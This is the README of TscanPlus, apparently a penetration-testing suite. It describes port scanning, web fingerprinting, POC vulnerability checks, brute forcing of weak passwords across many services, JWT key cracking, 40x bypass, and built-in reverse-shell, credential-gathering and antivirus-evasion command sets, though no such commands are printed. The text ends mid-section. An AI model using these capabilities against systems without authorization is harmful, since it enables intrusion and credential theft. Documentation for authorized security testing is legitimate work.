

<div align=center><img src=images/TscanPlus.png width=50% ></div>

## TscanPlus

**TscanPlus** is a comprehensive network security detection and operations tool designed for rapid asset discovery, identification, and assessment. It helps build a foundational asset information database and assists security teams or operations personnel in efficiently scouting and scanning assets, identifying vulnerabilities and attack surfaces.

**【Main Features】**: Port scanning, service identification, URL fingerprinting, POC validation, weak password brute force, directory scanning, UrlFinder, domain detection, network reconnaissance, project management, etc.

**【Auxiliary Features】**: Encoding/decoding, encryption/decryption, CSRF exploitation, reverse shell, antivirus detection, privilege escalation tools, common commands, dictionary generation, Java encoding, asset sorting, host collision, 40x Bypass, JWT cracking, IP geolocation lookup, etc.

https://github.com/TideSec/TscanPlus/assets/46297163/0f8cff21-6c33-4da3-bb6d-5f33d032a23e

<video controls="controls" loop="loop" autoplay="autoplay"> 
    <source src="images/TscanPlus-Introduce.mp4" type="video/mp4">
</video>
In 2019, I developed a fingerprint recognition tool in Python — [TideFinger](https://github.com/TideSec/TideFinger), and also launched a free online fingerprint detection platform — Tide Finger [finger.tidesec.com](http://finger.tidesec.com). It has since accumulated over 30,000 users and performs around 2,000 fingerprint recognitions daily. In early 2023, I developed a Go version of [TideFinger_Go](https://github.com/TideSec/TideFinger_Go), gaining valuable experience in web and service fingerprint recognition.

Later, our team’s senior member developed **Tscan** based on Fscan, primarily for internal POC collection, organization, and forming an automated weapon library. It can accurately detect POCs based on fingerprint recognition results. **无影 (TscanPlus)** builds upon fingerprints and POCs, expanding with multiple automation features, significantly enhancing security operations and detection efficiency, and making it more convenient for cybersecurity professionals.

**【Key Features】**

1. **Fingerprint Database**: Built-in with over 52,000 fingerprint entries, capable of fingerprinting 10,000 web systems in just 8-10 minutes. It offers high efficiency and comprehensive fingerprint coverage.
2. **Automatic CMS & POC Association**: The tool automatically tags over 130 common CMS and frameworks used by red teams in fingerprint detection. It includes a large collection of high-quality POCs and supports external POC tools like Nuclei, Afrog, and Xray. It enables fingerprint and POC integration, automatically associating POCs with fingerprint results and providing direct access to POC packet details.
3. **Integrated Functionality**: When performing IP port scanning or URL scanning, it integrates POC detection, password cracking, and directory scanning. When a matching service or product is detected, it automatically triggers password cracking or POC detection.
4. **Weak Password Cracking**: Built-in weak password cracking for 34 common services, helping administrators identify weak passwords within internal networks. The tool includes optimized and simplified username and password dictionaries for each service. Supported services include SSH, RDP, SMB, MYSQL, SQLServer, Oracle, MongoDB, Redis, PostgreSQL, MemCached, Elasticsearch, FTP, Telnet, WinRM, VNC, SVN, Tomcat, WebLogic, JBoss, Zookeeper, Socks5, SNMP, WMI, LDAP, LDAPS, SMTP, POP3, IMAP, SMTP_SSL, IMAP_SSL, POP3_SSL, RouterOS, WebBasicAuth, Webdav, CobaltStrike, etc.
5. **Encoding, Hashing, Encryption, and More**: Supports 36 types of operations, including 8 encoding/decoding methods, 13 hashing algorithms, 9 encryption/decryption algorithms, 3 national encryption algorithms (SM), and 9 data formatting/conversion functions. This includes AES, RSA, SM2, SM4, DES, 3DES, Xor, RC4, Rabbit, Base64, Base32, URL encoding, ASCII, various base conversions, string-to-base conversions, HTML, Unicode, MD5, HMAC, SM3, SHA1, SHA2, SHA3, NTLM, JSON formatting and compression, XML formatting and compression, IP address-integer conversion, Unix timestamp conversion, text deduplication, case conversion, random string generation, string reversal, JWT parsing, weak password decryption, and more.
6. **Directory Enumeration**: Default scanning uses the HEAD method and supports customization of concurrency, timeout, filtering, and dictionary settings. Includes DirSearch dictionary, with options to import custom dictionaries or use the built-in fuzz tool to generate them.
7. **Shell Commands**: Includes 85 reverse shell commands, 26 Win internal commands (credential gathering, privilege escalation, lateral movement), 18 Linux internal commands, 31 download commands, 21 MSF generation commands, and CS evasion shell commands. The tool can automatically generate code based on shell type, OS type, and listener type.
8. **Flexible Proxy Settings**: Supports one-click global proxy configuration or enabling proxy settings for individual modules. It supports both HTTP(S) and SOCKS5 proxies, with authentication support.
9. **Fast Subdomain Enumeration**: Allows fast subdomain detection, with the ability to link to other functionalities. Supports multiple network space discovery platforms via API key integration, with one-click query and deduplication.
10. **Integrated Tools**: Includes asset sorting, JsFinder, Host collision, JWT key cracking, IP lookup, Windows privilege escalation tools, antivirus queries, Shiro decryption, and more.

**【Disclaimer & License】**

1. This tool is prohibited from being used for unauthorized commercial purposes, and **is not allowed to be used for unauthorized commercial purposes after any modification**.
2. This tool is intended solely for legitimate and authorized corporate security initiatives. When using this tool for testing, you must **ensure that the activity complies with local laws and regulations**, and that you have **obtained sufficient authorization**.
3. If you engage in any **illegal activities** while using this tool, you will bear full responsibility for the consequences. We will not be liable for any legal or associated liabilities.
4. Before installing and using this tool, please **carefully read and fully understand the terms** and accept all provisions of this agreement. Otherwise, do not use this tool. Your use of this tool, or any other express or implied action indicating acceptance of this agreement, will be considered as your acknowledgment and agreement to the terms of this agreement.

* ## Table of Contents

    - [Changelog](#changelog)
    - [Software Usage](#Software Usage)
      - [Software Download and Updates](#1-software-download-and-updates)
      - [Welcome](#2-welcome)
      - [Project Management](#3-project-management)
      - [Port Scanning](#4-port-scanning)
      - [URL Detection](#5-url-detection)
      - [Domain Enumeration](#6-domain-enumeration)
      - [POC Detection](#7-poc-detection)
      - [Password Cracking](#8-password-cracking)
      - [Space Mapping](#9-space-mapping)
      - [Encoding/Decoding](#10-encodingdecoding)
      - Light Weapon Library
        - [Directory Enumeration](#directory-enumeration)
        - [UrlFinder](#urlfinder)
        - [Host Collision](#host-collision)
        - [40x Bypass](#40x-bypass)
        - [JWT Decoding and Cracking](#jwt-decoding-and-cracking)
        - [IP Geolocation Lookup](#ip-geolocation-lookup)
        - [Proxy Pool Function](#proxy-pool-function)
      - Red Team Commands
        - [Red Team Commands](#red-team-commands)
        - [Download Commands](#download-commands)
        - [Web Shell](#web-shell)
        - [Java Encoding](#java-encoding)
        - [Reverse Shell](#reverse-shell)
        - [CS Session](#cs-session)
      - Auxiliary Tools
        - [Asset Sorting](#asset-sorting)
        - [Password Generation](#password-generation)
        - [Password Lookup](#password-lookup)
        - [Privilege Escalation Assistance](#privilege-escalation-assistance)
        - [Antivirus Lookup](#antivirus-lookup)
      - Other Features
        - [Export Functionality](#export-functionality)
        - [Database Management](#database-management)
        - [Configuration Management](#configuration-management)
        - [Theme Settings](#theme-settings)
        - [Log Functionality](#log-functionality)
    - [Software Download](#software-download)
    - [Acknowledgements](#acknowledgements)
    - [FAQ](#faq)

### Changelog

Thanks to all the experts for their valuable suggestions and bug reports!

**v2.6.5** 【2024.12.18】 Added proxy pool management, support for language switching, multiple network interface selection, and fixed/enhanced various features.

**v2.6** 【2024.10.18】 Added auto-update feature, password cracking result verification, and increased built-in POC count to over 2300.

**v2.5** 【2024.09.15】 Refactored the port scanning module, improving efficiency by 2-3 times, and addressed high resource usage in POC detection.

**v2.4** 【2024.09.01】 Optimized false positive detection algorithms, added webshell generation, fixed password cracking detection issues and crashes.

**v2.3** 【2024.08.12】 Framework upgrade, added log functionality, optimized resource usage, and improved space detection algorithms.

**v2.2** 【2024.07.22】 Added 1300+ POCs, Key authentication, Host collision, 40x Bypass detection, JWT cracking and encryption/decryption, IP geolocation lookup, etc.

**v2.1** 【2024.07.01】 Added custom passive fingerprinting, program interruption recovery, custom header information, and export Excel with high-risk asset red-marking.

**v2.0** 【2024.06.18】 Added encoding/decoding functionality, supporting 36 types of encoding, encryption, decryption, hashing, and custom Nuclei POC matching.

**v1.9** 【2024.05.28】 Added 8327 fingerprint detection rules, totaling 51,873, remote download of non-core configuration files, and added active fingerprint detection.

**v1.8** 【2024.05.01】 Improved password cracking functionality with multi-threading optimization, frontend responsiveness optimization for large assets, and project vulnerability detail display.

**v1.7** 【2024.04.16】 Added asset sorting feature, POC detection now supports direct integration with Nuclei, Xray, and Afrog, and custom POC functionality.

**v1.6** 【2024.03.25】 Added project management flow, enhanced module interactions, and enabled CRUD operations for all features and data via the database.

**v1.5** 【2024.03.01】 Added one-click API key availability check, updated AV detection database, and supported adding custom red team commands.

**v1.4** 【2024.02.18】 Added network space detection module, built-in 9 common space detection APIs, and added recursive directory enumeration and filtering features.

**v1.3** 【2024.01.22】 Added password generation feature, built-in three generation modes, asset weak password query function with 11,000+ records.

**v1.2** 【2024.01.10】 Added subdomain enumeration and interface query functions, optimized fingerprint detection for non-web services, and added Excel export feature.

**v1.1** 【2023.12.27】 Added Java command encoding, refactored directory enumeration for 10x efficiency improvement, and synchronized IP scanning and fingerprint detection.

**v1.0** 【2023.12.21】 Implemented local/global proxy functionality, supporting HTTP(s)/SOCKS5, official release.

**v0.9** 【2023.12.19】 Implemented task linkage between features and right-click menu interactions.

**v0.8** 【2023.12.15】 Added version update check, validity check, and configuration file read/write support.

**v0.7** 【2023.12.12】 Completed auxiliary features like antivirus query and privilege escalation assistance.

**v0.6** 【2023.12.10】 Completed reverse shell, CS session, download commands, and red team commands.

**v0.5** 【2023.12.08】 Implemented directory enumeration and fuzzing mode.

**v0.4** 【2023.11.29】 Completed weak password cracking module.

**v0.3** 【2023.11.18】 Implemented POC detection and POC fingerprint matching functionality.

**v0.2** 【2023.11.01】 Implemented URL scanning and web fingerprinting features.

**v0.1** 【2023.10.23】 Implemented IP and port scanning, service identification functionality.

**v0.0** 【2023.10.10】 Selected TscanPlus architecture and initial feature planning.

### Software Usage

#### 1. Download and Update

- **GitHub Download**: [TscanPlus Releases](https://github.com/TideSec/TscanPlus/releases)
- **Knowledge Planet**: 【Sword Shadow Security Lab】 (See QR code below for **more and updated versions**)

The software is developed using Wails and supports Windows, Mac, Linux, and other systems. It can be used directly after downloading.

Due to some security settings in macOS, individual issues such as errors or crashes may occur. Please refer to the FAQ at the bottom for more details.

For Windows users, the program relies on [Microsoft WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/). Windows 11 and Windows Server 2012 installations will install it by default, but some older machines (e.g., Windows Server 2008) may not have it. If WebView2 is missing, the program will guide you to download and install it. Additionally, the Windows version uses UPX compression, so antivirus software might flag it as a virus. Please check your system.

#### 2. Welcome

Upon running the software, please carefully read and fully understand the **"Disclaimer & Usage License"**. Afterward, check the **"I agree to all terms"** box on the Welcome page to proceed and use the software.

![image-20241225162240546](images/image-20241225162240546.png)

**【Key Authentication Feature】**

To make the "Shadowless (TscanPlus)" Poc detection more comprehensive and accurate, and to create a healthy ecosystem, a key authentication feature has been added.

After key authentication, users can access all the built-in POCs. Unauthenticated users are limited to only 420 POCs, while all other features remain fully functional.

![image-20241225162256822](images/image-20241225162256822.png)

Upon key authentication, users will have access to all 1300+ built-in POCs.

![image-20241225162351020](images/image-20241225162351020.png)

**Three Ways to Obtain a Key:**

1. **Submit 3 POCs on the Poc platform**: After submitting three POCs, you will receive three keys. For each additional POC submitted, you will receive one more key.
  
2. **Submit a valid bug in the discussion group or GitHub Issues**: Once the bug is fixed, you will receive one key.

3. **Join the Knowledge Planet**: You will receive three keys directly upon joining, and these can be reset every three months. Additionally, each POC submission after that will earn you one more key.

**Key Authentication Details:**

1. **Network Requirement**: The first time you authenticate your key, you will need an internet connection (to connect to poc.tidesec.com) for verification. Once successfully authenticated, you will not need to reconnect for subsequent verifications.

2. **Hardware Binding**: Each key can only be used with one client, typically linked to hardware serial numbers like network card IDs. Therefore, changing hardware may cause the authentication to fail.

3. **Purpose of Key Authentication**: The key system is designed to support POC usage and collection, creating a beneficial cycle—“What we take from the community, we give back to the community.” We encourage users who have POCs to contribute them.

**For detailed instructions on submitting, obtaining, and using the key, please visit**: [http://poc.tidesec.com/index/explain.html](http://poc.tidesec.com/index/explain.html)

#### 3、Project Management

The project management feature integrates various functions into a workflow. Users can design project tasks based on their usage scenarios, seamlessly incorporating "Asset Mapping," "Subdomain Enumeration," "IP/Port Scanning," "Password Cracking," "POC Detection," "URL Scanning," "Directory Scanning," "UrlFinder," and other functionalities. The results of project execution will be stored in the corresponding project database, facilitating subsequent queries and usage.

**【Task Configuration】**

After adding target assets and configuring task parameters, TscanPlus will execute the corresponding operations in the background and display the results in the relevant function tab.

1. **Sequential Execution of Tasks**: 
   - "Asset Mapping" → "Subdomain Enumeration" → "IP/Port Scanning" → "Password Cracking" → "POC Detection" → "URL Scanning" → "Directory Scanning" → "UrlFinder".
   - By default, assets discovered in previous steps will be used as input for subsequent tasks.

2. **Asset Mapping**: 
   - If assets discovered by the asset mapping process may not belong to your target range, enable the “Scan and POC Detection for Mapped Assets” option. However, be cautious, as space mapping might involve assets beyond your authorized scope.

3. **URL Detection**:
   - Enabling the URL scanning function will trigger URL fingerprint detection for all web applications discovered from domain names, IPs, URLs, and space mapping.

4. **POC Matching**:
   - If you do not select "POC Fingerprint Matching," all detected assets will be tested against all POCs.

5. **Port and Service Cracking**:
   - Enabling "Crack All Ports and Services" will initiate cracking for all matched ports and services. If not enabled, only 8 common services will be cracked.

6. **Directory Scanning**:
   - When using the directory scanning feature:
     - If you select **"URL List Only"**, only the URLs in the list will undergo directory scanning.
     - If you select **"All Discovered URLs"**, all URLs discovered through IP, domain, and other tasks will undergo directory scanning. Be aware that if there are many URLs, this may slow down the process.

![image-20241225162433149](images/image-20241225162433149.png)

**【Project Management】**

In the project management section, users can view an intuitive project overview, including details such as the total number of projects, URL assets, IP assets, total vulnerabilities, and sensitive information. Users can also perform operations such as editing, re-executing, stopping, or deleting any project.

![image-20241225162448784](images/image-20241225162448784.png)

**【Results Display】**

All scan results will be displayed in the corresponding functional tab for easy access and review.

<div align=center><img src=images/image-20240327160956342.png width=80% ></div>

#### 4. Port Scanning

This function allows for live host detection, port scanning, service identification, and banner grabbing. It can recognize over 100 types of services and protocols.

**【Task Configuration】**

- **IP Format**: 
  - The target IPs can be separated by line breaks and support the following formats:
    - `192.168.1.1`
    - `192.168.1.1/24` (CIDR notation for network range)
    - `192.168.1.1-255` (range from `192.168.1.1` to `192.168.1.255`)
    - `192.168.1.1,192.168.1.3` (comma-separated list)

- **IP Exclusion**: 
  - You can exclude specific IPs by adding `!` before the IP address or network range: 
    - `!192.168.1.1/26` (excludes this IP range)

- **Task Configuration Options**:
  - **Port Strategy**: Choose the port range or specific ports to scan.
  - **Ping Scan**: Enable or disable ping (ICMP) scanning to check if the host is up.
  - **Password Cracking Synchronization**: Optionally synchronize the password cracking task.
  - **POC Detection Synchronization**: Optionally synchronize POC (Proof of Concept) vulnerability detection.
  - **Proxy**: Enable proxy usage during the scan if needed.

Once the configuration is done, you can start the scan to gather port and service information.

**【Scan Results】**

The scan results are displayed as follows, showing service-related protocols, banners, status codes, titles, etc. If a product that may have a vulnerability is detected in the banner, it will be highlighted in red.

By selecting a specific row, you can right-click to perform individual POC testing, weak password testing, directory enumeration, etc. You can also save data individually or save all results.

![image-20241225162609861](images/image-20241225162609861.png)

To facilitate use in certain scenarios, servers with open port 445 in internal networks will automatically undergo MS17010 vulnerability exploration. This process minimizes the impact on the server while attempting to detect potential vulnerabilities.

<div align=center><img src=images/image-20240617181901258.png width=80% ></div>

**【Feature Integration】**

Within any functionality, you can link it with other features. For example, when performing an IP scan, you can simultaneously enable password cracking and POC detection. If a matching port service is found, password cracking will automatically be initiated; if a matching fingerprint is found, POC detection will be triggered. Simply check these two options, and the results will be displayed in the relevant module.


<div align=center><img src=images/image-20231221144525144.png width=80% ></div>

https://github.com/TideSec/TscanPlus/assets/46297163/2a88ced9-1612-4015-aa5e-0bb0e243525a

<video controls="controls" loop="loop" autoplay="autoplay"> 
    <source src="images/TscanPlus.mp4" type="video/mp4">
</video>

**【Advanced Configuration】**

In the advanced configuration, you can set the proxy address. When global proxy is enabled, all functions will be routed through the proxy. Both HTTP(S) and SOCKS5 proxies are supported, and authentication is also available. You can also set global cookies or User-Agent (UA), among other settings.

Proxy formats:

- **HTTP Proxy Format**: `http://10.10.10.10:8081` or `http://user:pass@10.10.10.10:8081`

- **HTTPS Proxy Format**: `https://10.10.10.10:8081` or `https://user:pass@10.10.10.10:8081`

- **SOCKS5 Proxy Format**: `socks5://10.10.10.10:8081` or `socks5://user:pass@10.10.10.10:8081`


<div align=center><img src=images/image-20231221133246236.png width=80% ></div>


#### 5. URL Detection

TscanPlus currently integrates more than 26,000 fingerprints. After multiple optimizations, it has significantly improved the concurrency efficiency of asset discovery. It only takes 8-10 minutes to perform fingerprint recognition on 10,000 web systems. In terms of efficiency and fingerprint coverage, it is considered to be one of the highest available tools.

**【Task Configuration】**

URL detection is mainly used for bulk detection of web addresses. The input format is one URL per line, with the prefix being `http` or `https`:
```
http://www.abc.com
http://192.168.1.1:8080
https://www.abc.com:8443
```

Similarly, you can choose the number of threads, whether to enable POC detection, whether to enable the proxy, and once configured, you can start the scan.

**【Custom Fingerprints】**

Since version v2.1, TscanPlus supports custom fingerprints, including both passive and active fingerprints.

When active fingerprint detection is enabled, you can edit the `FingerDir.yaml` file in the configuration directory to add active fingerprint rules. Each added active fingerprint will send an additional HTTP request during fingerprint recognition. If many active fingerprints are added, it can affect the efficiency of fingerprint recognition, so it is recommended to add them with caution.

<div align=center><img src=images/image-20240701110500509.png width=80% ></div>

In the configuration directory, there is a `Finger.json` file, which serves as the rule base for passive fingerprint recognition. The fingerprint library uses the Wappalyzer format. To make custom fingerprints more practical, two additional keys, `headerstr` and `titlestr`, are added. These allow for matching header and title strings. If a custom fingerprint overlaps with a built-in fingerprint, the custom fingerprint will take priority. After adding custom fingerprints, be sure to test them before using them in production.

<div align=center><img src=images/image-20240701110842309.png width=80% ></div>

**【Scan Results】**

The scan results are displayed as follows, showing the web site's title, banner, status code, middleware, WAF detection, etc. If a potentially vulnerable product is identified in the banner, it will be highlighted in red.

By selecting a specific line, the right-click menu allows you to run POC testing, directory enumeration, etc., for that particular address. You can also save individual entries or save all results.


<div align=center><img src=images/image-20231221133907830.png width=80% ></div>

#### 6. Domain Enumeration

TscanPlus integrates multiple features for domain enumeration. It supports dictionary-based enumeration and querying via multiple free interfaces.

**【Task Configuration】**

Domain enumeration is network-dependent, so when dealing with multiple domains, it processes them one by one. By default, it uses a dictionary of 10,000 entries and 50 threads. In optimal network conditions, it takes about 12 seconds.

Enter one domain per line without the `http` prefix, such as:
```
tidesec.com
tidesec.com.cn
```

You can choose the number of threads (recommended range: 50-100), whether to enable POC detection, and whether to enable fingerprint recognition. Once configured, you can start the domain enumeration task.

**【Scan Results】**

The scan results are displayed as follows, showing subdomains, resolved IPs, open ports, website titles, domain sources, etc. If a potentially vulnerable product is identified in the banner, it will be highlighted in red.

By selecting a specific line or multiple lines, the right-click menu allows you to run POC testing, directory enumeration, etc., for that particular address. You can also save individual entries or save all results.


<div align=center><img src=images/image-20240110164454188.png width=80% ></div>

#### 7. POC Detection

TscanPlus has built-in POCs and categorizes them into levels. Level 1 POCs are the most common and frequently used, Level 2 POCs are more general, and Level 3 POCs are less common.

**【Task Configuration】**

URLs can be imported from a txt file or entered manually. The URLs must have the HTTP/HTTPS prefix.

One important option is "POC Fingerprint Matching." This option is enabled by default. When enabled, POCs are matched based on fingerprint information. If no match is found, no further testing is done. When disabled, all selected POCs will be tested regardless of the fingerprint match.

You can specify external POC files or POC folders by entering the absolute path, such as `C:\POC`. However, imported POCs will not be fingerprint-matched, and the system will run all imported POCs by default.

External POCs support Xray or similar formats. For details on writing POCs, refer to:
- [Xray POC documentation](https://poc.xray.cool/)
- [Xray POC generation guide](https://phith0n.github.io/xray-poc-generation/)

**【Custom POC】**

POC detection can directly call external POC tools like Nuclei, Xray, Afrog, etc., and allows for custom POCs for each tool.

When the "POC Fingerprint Matching" feature is enabled, the program will perform a fuzzy match of external POCs based on the target fingerprint, followed by POC detection. This significantly reduces the number of POC packets sent and shortens the detection time.

<div align=center><img src=images/image-20240417162352536.png width=80% ></div>

Nuclei POCs are by default downloaded to the `nuclei-templates` directory in the user folder. The program will automatically recognize this directory, so you do not need to specify the Nuclei POCs when using the "POC Fingerprint Matching" feature in Nuclei.

However, Afrog POCs are embedded in the program by default. If you want to use the "POC Fingerprint Matching" feature in Afrog, you need to download the POC files from [Afrog GitHub Repository](https://github.com/zan8in/afrog/tree/main/pocs/afrog-pocs) and specify the directory where the POCs are stored within the program.

The fingerprint matching POC rules have been optimized and improved to minimize the number of POC detections while preventing false negatives. A POC detection level filter has been added to effectively avoid the large amount of info-level messages generated during default scanning by Nuclei and Afrog tools.

<div align=center><img src=images/image-20240617182603002.png width=80% ></div>

The custom POC feature of TscanPlus (Wuying) is also well-developed and is compatible with both Xray POC 1.0 and Fscan POC formats. 

When writing custom POCs, you can use the following tool for testing: [Xray POC Generation Tool](https://github.com/phith0n/xray-poc-generation).

**【Scan Results】**

The scan results will show the vulnerable sites, POC names, Banners, status codes, titles, and more. After selecting a row, you can view the Request and Response packets.

At the bottom, it will display the number of live targets, successful POC detections, the status of the detection queue, and the time spent.


<div align=center><img src=images/image-20231221135024558.png width=80% ></div>

#### **8. Password Cracking**

TscanPlus has built-in support for weak password cracking for 34 common services. This allows administrators to check for weak passwords in internal networks. To improve detection efficiency, TscanPlus selects and streamlines the username and password dictionaries for each service. The supported services include: SSH, RDP, SMB, MySQL, SQL Server, Oracle, MongoDB, Redis, PostgreSQL, MemCached, Elasticsearch, FTP, Telnet, WinRM, VNC, SVN, Tomcat, WebLogic, JBoss, Zookeeper, Socks5, SNMP, WMI, LDAP, LDAPS, SMTP, POP3, IMAP, SMTP_SSL, IMAP_SSL, POP3_SSL, RouterOS, WebBasicAuth, WebDAV, CobaltStrike, and others.

**【Task Configuration】**

Select the service to be cracked from the left panel, then input the target address. When configuring the task on the right, you can choose to use the built-in dictionaries or import your own, enable fingerprint recognition, configure Oracle listener settings, and execute commands, among other options.

<div align=center><img src=images/image-20240417162518632.png width=80% ></div>

**【Scan Results】**

The scan results will show the services with weak passwords, accounts, passwords, banners, executed commands, and time taken.

At the bottom, the number of live targets, successful crack count, detection queue status, and time spent will be displayed. The cracking log will also be shown in real-time.

<div align=center><img src=images/image-20231221140432486.png width=80% ></div>

In TscanPlus v2.6 and later versions, a new feature for password cracking result connection validation has been added. This allows for connection checks on the cracked weak passwords and supports over a dozen common protocols.

<div align=center><img src=images/mysql.png width=80% ></div>

<div align=center><img src=images/ssh.png width=80% ></div>

#### **9. Space Mapping**

To make information collection quicker and more convenient, TscanPlus integrates multiple network space mapping interfaces, including nine mainstream space exploration APIs: **Hunter** (from Eagle Map), Fofa, Shodan, 360 Quake, Zoomeye (Zhong Kui's Eye), Censys, ThreatBook (from WeiStep Online), BinaryEdge, VirusTotal, etc. These APIs allow searches based on domain names, IP addresses, ports, applications, services, and more. The results from these network space exploration APIs will be deduplicated and integrated.

**【Task Configuration】**

First, configure the key information. If you don't have a key, you can click the "API Application" link to apply for one. Afterward, click "Enable" to use the corresponding API.

On the main interface, you can select fields like domain name, IP address, port, application, service, body, certificate, ICON, etc., and input search criteria. TscanPlus will deduplicate and integrate all results.

For the Fofa API, a custom API address feature has been added. When setting the Fofa API Key, if you need to use a custom API address, the format should be `email:key||url`, where the double vertical bars (`||`) separate the key and the URL. For example: `9*****@qq.com:3f21a408*********6e3fa8078||http://fofaapi.com`. After adding the key, you can perform a key validity check to test if data can be fetched.

<div align=center><img src=images/image-20240327165140791.png width=80% ></div>

**【Query Results】**

The query results are displayed as follows, showing information such as URL, IP, domain name, port, protocol, title, fingerprint, application, Whois, ICP filing, ISP, OS, region, last updated time, and the source of the API.

You can select one or more rows, right-click the menu to perform individual POC tests, directory enumeration, port scanning, etc. You can also save data either individually or all at once.

<div align=center><img src=images/image-20240327164931978.png width=80% ></div>

Custom syntax is supported; however, since each space mapping engine uses different syntax, custom syntax is generally not interchangeable.

<div align=center><img src=images/image-20241018143704418.png width=80% ></div>

#### 10. Encoding and Decoding

The encoding and decoding module supports a total of 36 types, including encoding and decoding, hash calculation, encryption and decryption, national cryptography algorithms, data formatting, and other transformations. Among these, there are 8 types for encoding and decoding, 13 types for hash calculation, 9 types for encryption and decryption, 3 types for national cryptography algorithms, 9 types for data formatting, and 2 types for other transformations.

**【Task Configuration】**

1. Simply select the corresponding encoding option from the left sidebar of the "Encoding and Decoding" function page, and it will be added to the right-side tab.

2. Each tab supports multiple encodings stacked together and allows encoding order adjustments. The output of the previous encoding will serve as the input for the next encoding.

3. For each encoding, you can choose whether to enable encryption or decryption, and configure input and output formats. Common formats like RAW, Hex, and base64 are supported.

4. "Wuying" supports multiple tab switching. You can configure multiple tabs according to your needs to compare results.

5. The system can remember the current encoding configuration, so next time you run the software, you can directly use the previous configuration.

<div align=center><img src=images/image-20240617175854995.png width=80% ></div>

**【Output Results】**

**1. Encoding and Decoding**: Base64, Base32, URL encoding/decoding, ASCII, various base conversions, string and base conversions, HTML encoding/decoding, Unicode encoding/decoding, one-click encoding/decoding, etc.

<div align=center><img src=images/image-20240617180132022.png width=80% ></div>

The one-click encoding/decoding feature allows you to encode and decode the input characters and output the results.

<div align=center><img src=images/image-20240617180214330.png width=80% ></div>

**2. Hash Calculation**: MD5, HmacMD5, SM3, HmacSM3, SHA1, HmacSHA1, SHA2-224, SHA2-256, SHA2-384, SHA2-512, HmacSHA2, SHA3-224, SHA3-256, SHA3-384, SHA3-512, HmacSHA3, NTLM, HmacNTLM, one-click hash, etc.

<div align=center><img src=images/image-20240617180257634.png width=80% ></div>

The one-click hash feature calculates all hash values for the input characters and outputs the results.

<div align=center><img src=images/image-20240617180402999.png width=80% ></div>

**3. Encryption and Decryption**: AES encryption/decryption, RSA encryption/decryption, SM2 encryption/decryption, SM4 encryption/decryption, DES encryption/decryption, 3DES encryption/decryption, Xor encryption/decryption, RC4 encryption/decryption, Rabbit encryption/decryption, automatic RSA key generation, automatic SM2 key generation, etc.

<div align=center><img src=images/image-20240617180635476.png width=80% ></div>

<div align=center><img src=images/image-20240617180748714.png width=80% ></div>

**4. National Cryptography Algorithms**: SM2 elliptic curve asymmetric encryption algorithm, SM4 block symmetric encryption algorithm, SM3 cryptographic hash algorithm, and support for automatic SM2 key generation.

<div align=center><img src=images/image-20240617180836752.png width=80% ></div>

**5. Data Formatting**: JSON formatting and compression, XML formatting and compression, IP address and integer conversion, String.fromCharCode, Unix timestamp conversion, remove duplicate lines from text, letter case conversion, generate random strings, string reversal.

<div align=center><img src=images/image-20240617181019264.png width=80% ></div>

<div align=center><img src=images/image-20240617181053649.png width=80% ></div>

**6. Other**: JWT parsing and weak password detection, one-click decryption of all OA (Office Automation).

<div align=center><img src=images/image-20240617181132609.png width=80% ></div>

#### 11. Light Weaponry Library

##### 【Directory Enumeration】

Directory enumeration mainly targets web sites to enumerate directories. It supports dictionary mode, fuzzing mode, and live detection. The default method is HEAD, but GET is also supported.

**【Task Configuration】**

By default, the dictionary uses the built-in `dirsearch` dictionary, which contains approximately 9000 entries. It also supports extensions for asp, aspx, jsp, php, py, and more. When TideFuzz is enabled, it recursively fuzzes based on the enumeration results.

In fuzzing mode, you need to input fuzz metacharacters, which will generate a dictionary based on the fuzz length. However, be cautious, as the fuzz dictionary cannot be too large. If the dictionary exceeds 100,000 lines, a prompt will appear stating that the dictionary is too large and cannot be scanned.

Additional configuration options include setting timeout duration, retry attempts on timeout, interval time, URL concurrency, and directory thread count. You can also filter by file extensions and status codes.

**【Scan Results】**

The scan results will display the discovered URLs, status codes, body lengths, and more. You can select a specific entry to view the request and response packets.

At the bottom, it will show the number of alive targets, the number of successful enumerations, the detection queue status, the time taken, and other details.

<div align=center><img src=images/image-20240219111318207.png width=80% ></div>

##### 【UrlFinder】

The **URLFinder** feature is designed for fast and comprehensive extraction of target information. It is used to analyze the JavaScript and URLs within a page to uncover hidden sensitive information or unauthorized API endpoints.

**【Task Configuration】**

After entering the target address, you can select a mode:
- **Normal Mode**: By default, it crawls single-layer links.
- **Deep Mode**: Crawls links up to three layers deep, which takes relatively longer.

You can set the number of link layers to probe. The maximum number is limited to prevent unrestricted crawling.

The **"Only Show This Site"** option filters the URLs and JS results to show only relevant information from the current website. Additional configurations include the ability to set thread counts, and filter by file extensions, status codes, and keywords.

**【Scan Results】**

The scan results will display discovered URLs, status codes, body lengths, etc. If sensitive information is found, it will be shown in the **"Title || Sensitive Information"** column.

At the bottom, the scan results will show the number of alive targets, the number of successful enumerations, the detection queue status, time taken, and other related information.

- **Filter Rules**:
  1. For pages that return the same length and status code, if they appear more than 5 times, they will no longer be displayed.
  2. Additional features such as keyword filtering, length filtering, and custom suffix options are supported.

<div align=center><img src=images/image-20240327163203001.png width=80% ></div>

##### **【Host Collision】**

**Host Collision** works by modifying the Host field to send packets. This feature allows for IP and domain collision matching, which enables access to systems that are only accessible through specific hosts. With the increasing use of reverse proxy access via load balancers like Nginx, some internal and external domains might use the same load balancer for reverse proxying. This means that by modifying the Host header, access to internal systems might be possible.

<div align=center><img src=images/image-20240721003650858.png width=80% ></div>

---

##### **【40x Bypass】**

During penetration testing, it’s common to encounter assets that return 40x status codes (like 403, 404, etc.). Some of these pages can be bypassed using different techniques such as varying HTTP methods, referer manipulation, proxy IPs, modifying HTTP headers, or changing the case of characters in the URL. The **40x Bypass** detection feature integrates 8 common bypass methods and allows you to modify dictionary files under the `config/4xxBypass` directory.

<div align=center><img src=images/image-20240721005116585.png width=80% ></div>

---

##### **【JWT Decoding and Cracking】**

This feature allows for the encoding and decoding of JWTs, as well as cracking their secret keys. It supports a wide range of algorithms such as HS256, HS384, HS512, RS256, RS384, RS512, ES256, EDDSA, etc. It includes a built-in secret key dictionary with over 100,000 entries, and can crack keys in just 2 seconds.

<div align=center><img src=images/image-20240721010740227.png width=80% ></div>

---

##### **【IP Ownership Query】**

This feature automatically extracts and queries the physical address of assets like IP addresses and subdomains. It is integrated into IP scanning, URL probing, and subdomain enumeration to add the capability of IP ownership querying.

<div align=center><img src=images/image-20240721010957230.png width=80% ></div>

<div align=center><img src=images/image-20240721011103618.png width=80% ></div>

---

##### **【Proxy Pool Functionality】**

The **Proxy Pool** feature includes the following capabilities:
